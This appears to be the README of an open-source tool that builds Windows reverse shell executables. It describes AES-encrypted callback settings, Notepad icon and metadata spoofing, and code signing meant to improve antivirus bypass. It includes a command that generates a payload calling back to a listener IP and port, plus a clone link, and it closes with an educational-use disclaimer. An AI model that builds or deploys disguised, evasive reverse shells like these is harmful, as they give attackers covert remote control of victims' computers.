# 🛡️ AES Encrypted Payload Generator

This tool generates a Windows reverse shell payload with **AES-encrypted IP and command values**, compiles it with optional **Notepad disguise**, and supports automatic cleanup.
  
---
  
## ⚙️ Features

- 🔐 AES (ECB mode) encryption for sensitive data
- 🧩 Dynamic payload generation in C
- 🪟 Native Windows API usage (with manual `GetProcAddress` resolution)
- 🎭 Optional Notepad spoofing (icon + metadata)
- 🛠️ Easy cross-compilation via MinGW (Linux)
  
---
  
## 🚀 Usage

### Basic Example
```bash
python3 payload_gen.py --ip 192.168.1.100 --port 4444 --notepad --sign
```
  
### Arguments
  
**--ip** : IP address of the reverse shell listener (required).  
**--port** : TCP port for the connection (default: 49557).  
**--cmd** : Command to execute (default: cmd.exe).  
**--notepad** : Mimic Notepad metadata and icon.  
**--keep** : Keep temporary files (.c, .rc, .res) after building.  
**--sign** : Uses sign_exe.py to sign the exe, improving AVs bypass.  
  
---
  
## Download
```bash
git clone https://github.com/WisePlace/Payload-Generator.git
```
  
---
  
## Disclaimer
  
**This project is provided strictly for educational and ethical security research purposes.  
Unauthorized use against third-party systems is illegal. You are solely responsible for how you use this code.**  
